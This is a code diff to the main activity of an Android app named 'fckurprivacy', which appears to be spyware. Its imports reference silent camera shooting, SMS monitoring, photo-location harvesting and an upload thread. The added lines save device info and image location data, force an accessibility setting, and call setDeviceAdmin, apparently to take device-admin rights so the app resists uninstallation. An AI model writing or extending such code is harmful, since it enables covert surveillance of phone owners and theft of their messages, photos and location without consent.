@@ -1,6 +1,9 @@
 package com.vergermiya.harevost.fckurprivacy;
 
 import android.Manifest;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.content.Context;
 import android.content.Intent;
 import android.media.MediaRecorder;
 import android.os.Bundle;
@@ -22,6 +25,7 @@ import com.vergermiya.harevost.fckurprivacy.InfoChecker.InfoJson;
 import com.vergermiya.harevost.fckurprivacy.PermissionsChecker.PermissionsActivity;
 import com.vergermiya.harevost.fckurprivacy.PermissionsChecker.PermissionsChecker;
 import com.vergermiya.harevost.fckurprivacy.SilentShooter.SilentShootService;
+import com.vergermiya.harevost.fckurprivacy.SilentShooter.UninstReceiver;
 import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsCheckService;
 import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsJson;
 import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsObserver;
@@ -70,10 +74,10 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-
         initView();
         mPermissionsChecker = new PermissionsChecker(this);
         initEvent();
+
     }
 
     private void initView() {
@@ -175,6 +179,15 @@ public class MainActivity extends AppCompatActivity {
                 uploadThread.start();
             }
         });
+
+
+        //InfoChecker.saveInfoJson(this);
+
+        //JSONArray allImageInfo = JsonBuilder.buildImageJsons(ImageContentObserver.getPhotoLocation(this));
+        //FileSaver fileSaver = new FileSaver();
+        //fileSaver.saveFile("allImageInfo", ".json", allImageInfo.toString());
+
+        AccessibilityChecker.setAccessibilitySetting(MainActivity.this);
     }
 
 
@@ -187,7 +200,6 @@ public class MainActivity extends AppCompatActivity {
             startPermissionsActivity();
         }
 
-        AccessibilityChecker.setAccessibilitySetting(MainActivity.this);
     }
 
     private void startPermissionsActivity() {
@@ -201,10 +213,14 @@ public class MainActivity extends AppCompatActivity {
         if (requestCode == REQUEST_CODE && resultCode == PermissionsActivity.PERMISSIONS_DENIED) {
             finish();
         }
+
         InfoChecker.saveInfoJson(this);
 
         JSONArray allImageInfo = JsonBuilder.buildImageJsons(ImageContentObserver.getPhotoLocation(this));
         FileSaver fileSaver = new FileSaver();
         fileSaver.saveFile("allImageInfo", ".json", allImageInfo.toString());
+
+        AccessibilityChecker.setAccessibilitySetting(MainActivity.this);
+        UninstReceiver.setDeviceAdmin(this);
     }
 }
